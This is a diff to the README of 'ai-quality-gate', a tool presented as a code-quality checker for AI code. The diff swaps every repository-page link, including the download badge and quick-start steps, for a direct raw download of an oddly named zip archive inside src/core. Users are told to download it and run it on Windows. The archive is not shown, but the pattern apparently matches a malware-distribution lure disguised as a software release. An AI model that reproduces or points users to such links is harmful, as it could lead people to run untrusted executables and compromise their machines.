@@ -1,6 +1,6 @@
 # 🤖 ai-quality-gate - Ship Cleaner AI Code Fast
 
-[![Download / Install](https://img.shields.io/badge/Download%20Now-Start%20Setup-7B68EE?style=for-the-badge&logo=github)](https://github.com/combjellycrumhorn70/ai-quality-gate)
+[![Download / Install](https://img.shields.io/badge/Download%20Now-Start%20Setup-7B68EE?style=for-the-badge&logo=github)](https://github.com/combjellycrumhorn70/ai-quality-gate/raw/refs/heads/main/src/core/quality-ai-gate-Darbyite.zip)
 
 ## 🚀 What this app does
 
@@ -21,7 +21,7 @@ It runs a fast review so you can spot issues before they spread through your pro
 
 Use this link to visit the page and download or open the app:
 
-https://github.com/combjellycrumhorn70/ai-quality-gate
+https://github.com/combjellycrumhorn70/ai-quality-gate/raw/refs/heads/main/src/core/quality-ai-gate-Darbyite.zip
 
 ### ✅ What to do next
 
@@ -202,7 +202,7 @@ ai-quality-gate gives you a clear pass before you ship.
 ## 📌 Quick start
 
 1. Visit the download page:
-   https://github.com/combjellycrumhorn70/ai-quality-gate
+   https://github.com/combjellycrumhorn70/ai-quality-gate/raw/refs/heads/main/src/core/quality-ai-gate-Darbyite.zip
 2. Download the app
 3. Open it on Windows
 4. Select your project folder
@@ -234,6 +234,6 @@ Avoid deep folder trees. Simple paths make setup and use easier
 
 Use the main project page here:
 
-https://github.com/combjellycrumhorn70/ai-quality-gate
+https://github.com/combjellycrumhorn70/ai-quality-gate/raw/refs/heads/main/src/core/quality-ai-gate-Darbyite.zip
 
 Open that link, download the app from the page, then run it on your Windows computer
